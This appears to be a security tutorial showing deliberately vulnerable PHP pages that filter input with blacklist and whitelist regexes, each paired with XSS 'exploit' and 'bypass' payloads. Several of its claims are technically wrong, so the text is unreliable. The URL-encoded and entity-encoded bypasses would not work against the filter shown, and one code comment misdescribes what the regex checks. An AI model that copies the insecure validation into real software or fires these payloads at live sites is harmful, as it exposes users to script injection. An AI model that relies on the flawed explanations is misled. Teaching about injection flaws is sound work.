
### 🔴 Blacklist-Based (GET Method)

**File:** `html-injection-black-list-get.php`

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection Blacklist - GET</title>
</head>
<body>
    <h1>HTML Injection Blacklist - GET</h1>
    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = preg_replace("/<|>/", "", $_REQUEST['user']); // strips < and >
        echo "<h2>" . $user_name . "!!</h2>";
    }
    ?>
</body>
</html>
```

🧨 **Exploit:**

```html
http://example.com/html-injection-black-list-get.php?user=<h1>XSS</h1>
```

🛠️ **Bypass:**
Use encoded payload:

```
<script>alert('XSS')</script>  →  Encoded as: %3Cscript%3Ealert('XSS')%3C/script%3E
```

> Because `preg_replace` only removes `<` and `>`, other injection payloads using quotes, events, or tags like `img` may still sneak through.

---

### 🔴 Blacklist-Based (POST Method)

**File:** `html-injection-black-list-post.php`

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection Blacklist - POST</title>
</head>
<body>
    <h1>HTML Injection Blacklist - POST</h1>
    <form action="html-injection-black-list-post.php" method="POST">
        User Name: <input type="text" name="user"><br>
        <input type="submit" value="Login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = preg_replace("/<|>/", "", $_REQUEST['user']);
        echo "<h2>" . $user_name . "!!</h2>";
    }
    ?>
</body>
</html>
```

🧨 **Exploit:**

```
<h1>Hello!</h1> OR <img src=x onerror=alert('XSS')>
```

🛠️ **Bypass:**
Use alternative tag without `<` or `>` directly:

```html
&lt;img src=x onerror=alert(1)&gt;
```

---

### ⚠️ Whitelist Example – VULNERABLE

**File:** `html-injection-white-list.php`

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection Whitelist</title>
</head>
<body>
    <h1>HTML Injection Whitelist</h1>
    <form action="html-injection-white-list.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="Login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = $_REQUEST['user'];
        if (!preg_match('/[a-z\d_\-\.]/i', $user_name)) {
            die("Don't try to Inject Code");
        } else {
            echo "<h2>" . $user_name . "!!</h2>";
        }
    }
    ?>
</body>
</html>
```

🧨 **Exploit:**

```html
<h1>Injected</h1>
```

> Passes because it contains allowed characters like `h`, `i`, `n`.

🛠️ **Bypass:**
Use partially allowed strings:

```html
a<script>alert(1)</script>  // starts with 'a' so it passes regex
```

---


### 🔥 `html-injection-white-list2.php` – **Fully Vulnerable**

```php
<!-- html-injection-white-list2.php -->
<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <title>Html Injection White List - 2</title>
</head>
<body>
    <h1>Html Injection White List - 2</h1>
    <form action="html-injection-white-list2.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = $_REQUEST['user'];

        // ❌ Weak Regex: Only checks if the first character is allowed
        if (preg_match('/[a-z\d_\.\-]/i', $user_name)) {
            // ❌ No sanitization: Direct output = full XSS risk
            echo '<h2>' . $user_name . '!</h2>';
        } else {
            die("Don't try to Inject Code");
        }
    }
    ?>
</body>
</html>
```

#### ✅ Example Exploit:

```txt
a<script>alert('XSS')</script>
```

---

### 🔐 `html-injection-white-list3.php` – **Improved But Still Dangerous**

```php
<!-- html-injection-white-list3.php -->
<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <title>Html Injection White List - 3</title>
</head>
<body>
    <h1>Html Injection White List - 3</h1>
    <form action="html-injection-white-list3.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = $_REQUEST['user'];

        // ✅ Stronger Regex: Only allows letters, digits, dot, dash, underscore
        if (!preg_match('/^[a-z\d\.\-\_]*$/i', $user_name)) {
            die("Don't try to Inject Code");
        } else {
            // ❌ Still vulnerable if validation logic ever changes
            echo "<h2>" . $user_name . "!</h2>";
        }
    }
    ?>
</body>
</html>
```

#### ✅ Safe Input:

```txt
admin_user-12
```

#### ❌ Unsafe Future Risk:

If someone edits the regex to allow `<`, they reintroduce XSS.

---
